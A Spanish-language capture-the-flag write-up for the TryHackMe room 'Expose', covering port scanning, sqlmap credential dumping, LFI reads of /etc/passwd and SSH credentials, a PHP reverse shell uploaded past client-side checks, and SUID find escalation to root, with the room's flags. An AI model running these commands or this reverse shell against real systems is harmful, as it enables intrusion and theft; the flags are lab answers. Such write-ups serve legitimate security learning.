# TryHackMe — Expose Writeup

**Dificultad:** Media  
**Sistema:** Linux (Ubuntu 20.04)  
**Objetivo:** Obtener user flag y root flag  
**Fecha:** 24 de septiembre de 2026

---

## Índice
1. [Reconocimiento](#1-reconocimiento)
2. [Enumeración Web](#2-enumeración-web)
3. [SQL Injection](#3-sql-injection)
4. [LFI — Local File Inclusion](#4-lfi--local-file-inclusion)
5. [File Upload — Reverse Shell](#5-file-upload--reverse-shell)
6. [Acceso SSH](#6-acceso-ssh)
7. [Escalada de Privilegios](#7-escalada-de-privilegios)
8. [Flags](#8-flags)
9. [Lecciones aprendidas](#9-lecciones-aprendidas)

---

## 1. Reconocimiento

Escaneo completo de puertos con Nmap:

```bash
nmap -sV -sC -p- <IP> 
```

**Puertos encontrados:**

| Puerto | Servicio |
|--------|----------|
| 21     | FTP (vsftpd) — acceso anónimo vacío |
| 22     | SSH |
| 80     | HTTP (Apache) |
| 1337   | HTTP (Apache) ← principal |
| 1883   | MQTT |

**FTP anónimo:**
```bash
ftp <IP>
# Usuario: anonymous | Password: (vacío)
# El share estaba vacío
```

---

## 2. Enumeración Web

Enumeración de directorios en el puerto 1337:

```bash
gobuster dir -u http://<IP>:1337 \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt
```

**Directorios encontrados:**

| Ruta | Descripción |
|------|-------------|
| `/admin` | Portal admin básico |
| `/admin_101` | Portal admin con formulario vulnerable |
| `/phpmyadmin` | Panel de base de datos |

> **Lección:** La wordlist por defecto (`directory-list-2.3-medium.txt`) no encontró `/admin_101`. Fue necesario usar `raft-large-directories.txt` de SecLists.

---

## 3. SQL Injection

Al revisar el código fuente de `/admin_101/`, se encontró que el formulario hace POST a `/admin_101/includes/user_login.php` con el email prellenado `hacker@root.thm`.

```bash
# Ver código fuente
curl http://<IP>:1337/admin_101/

# SQLMap apuntando al endpoint correcto
sqlmap -u "http://<IP>:1337/admin_101/includes/user_login.php" \
  --data="email=hacker@root.thm&password=test" \
  --dbs --batch --level=3 --risk=2
```

**Base de datos encontrada:** `expose`

```bash
# Ver tablas
sqlmap -u "http://<IP>:1337/admin_101/includes/user_login.php" \
  --data="email=hacker@root.thm&password=test" \
  -D expose --tables --batch

# Dumpear tablas user y config
sqlmap -u "http://<IP>:1337/admin_101/includes/user_login.php" \
  --data="email=hacker@root.thm&password=test" \
  -D expose -T user,config --dump --batch
```

**Resultados:**

Tabla `user`:
| email | password |
|-------|----------|
| hacker@root.thm | VeryDifficultPassword!!#@#@!#!@#1231 |

Tabla `config`:
| url | password |
|-----|----------|
| /file1010111/index.php | easytohack |
| /upload-cv00101011/index.php | Solo usuarios con nombre que empieza con Z |

> **Lección:** Siempre revisar el código JS del formulario para saber a qué endpoint hace el POST. SQLMap falló cuando se apuntaba a la URL raíz en lugar del endpoint real.

---

## 4. LFI — Local File Inclusion

La ruta `/file1010111/index.php` tiene un parámetro `file` vulnerable a LFI:

```bash
# Leer /etc/passwd
curl -s "http://<IP>:1337/file1010111/index.php?file=/etc/passwd" \
  --data "password=easytohack"
```

**Usuario encontrado con shell:** `zeamkish` (único que empieza con Z)

```bash
# Leer credenciales SSH del usuario
curl -s "http://<IP>:1337/file1010111/index.php?file=/home/zeamkish/ssh_creds.txt" \
  --data "password=easytohack"
```

**Credenciales SSH obtenidas:** `zeamkish / easytohack@123`

> **Lección:** LFI como `www-data` no puede leer archivos con permisos restringidos como flags o `/root/`. Sin embargo, sí puede leer archivos accesibles al público como `ssh_creds.txt`.

---

## 5. File Upload — Reverse Shell

El portal `/upload-cv00101011/index.php` pide una contraseña y solo acepta `.jpg` y `.png` — pero la validación es solo del lado del cliente (JavaScript), por lo que se puede bypassear con curl.

**Crear reverse shell PHP:**
```bash
nano shell.php
```

Contenido:
```php
<?php
set_time_limit(0);
$ip = '<TU_IP_TUN0>';
$port = 4444;
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
$descriptorspec = array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));
$process = proc_open('/bin/sh -i', $descriptorspec, $pipes);
stream_set_blocking($sock,0);
stream_set_blocking($pipes[1],0);
stream_set_blocking($pipes[2],0);
while(1){
$r=array($sock,$pipes[1],$pipes[2]);
stream_select($r,$w,$e,null);
if(in_array($sock,$r)){fwrite($pipes[0],fread($sock,1400));}
if(in_array($pipes[1],$r)){fwrite($sock,fread($pipes[1],1400));}
if(in_array($pipes[2],$r)){fwrite($sock,fread($pipes[2],1400));}
}
?>
```

**Subir el archivo ignorando validación JS:**
```bash
curl http://<IP>:1337/upload-cv00101011/index.php \
  -F "password=zeamkish" \
  -F "file=@shell.php;type=image/jpg"
```

La respuesta indica la ruta del archivo: `/upload_thm_1001/`

**Escuchar y ejecutar:**
```bash
# Terminal 1
nc -lvnp 4444

# Terminal 2
curl http://<IP>:1337/upload-cv00101011/upload_thm_1001/shell.php
```

> **Lección:** Las validaciones solo en JavaScript son inútiles. Siempre se pueden bypassear enviando la petición directamente con curl o Burp Suite.

---

## 6. Acceso SSH

Con las credenciales obtenidas via LFI:

```bash
sshpass -p 'easytohack@123' ssh zeamkish@<IP>
```

---

## 7. Escalada de Privilegios

Buscar binarios con bit SUID activo:

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Binarios explotables encontrados:**
- `/usr/bin/find`
- `/usr/bin/nano`

**Escalar a root con `find`:**
```bash
/usr/bin/find . -exec /bin/sh -p \; -quit
```

**Verificar:**
```bash
whoami
# root
```

> **Lección:** `find` con SUID permite ejecutar comandos como root usando `-exec`. Siempre revisar GTFOBins para explotar binarios con permisos especiales.

---

## 8. Flags

```bash
# User Flag
cat /home/zeamkish/flag.txt
# THM{USER_FLAG_1231_EXPOSE}

# Root Flag
cat /root/flag.txt
# THM{ROOT_EXPOSED_1001}
```

---

## 9. Lecciones aprendidas

| # | Lección |
|---|---------|
| 1 | Siempre leer el código fuente JS para encontrar el endpoint real de un formulario |
| 2 | Usar wordlists grandes (SecLists) para no perderse directorios importantes |
| 3 | SQLMap necesita apuntar al endpoint exacto donde se procesa el login |
| 4 | Las credenciales de la BD no necesariamente funcionan en SSH |
| 5 | LFI como `www-data` tiene permisos limitados — buscar archivos legibles como `ssh_creds.txt` |
| 6 | Validaciones solo en JS son bypasseables directamente con curl |
| 7 | Siempre revisar SUID con `find / -perm -u=s -type f 2>/dev/null` |
| 8 | GTFOBins es la referencia para explotar binarios con SUID |

---

## Herramientas utilizadas

- `nmap` — Escaneo de puertos
- `gobuster` — Enumeración de directorios
- `sqlmap` — SQL Injection automatizado
- `curl` — Peticiones HTTP manuales
- `nc (netcat)` — Listener para reverse shell
- `sshpass` — Conexión SSH con contraseña en línea de comandos
- `find` — Búsqueda de SUID y escalada de privilegios

---

## Referencias

- [GTFOBins — find](https://gtfobins.github.io/gtfobins/find/)
- [SecLists](https://github.com/danielmiessler/SecLists)
- [TryHackMe — Expose](https://tryhackme.com/room/expose)
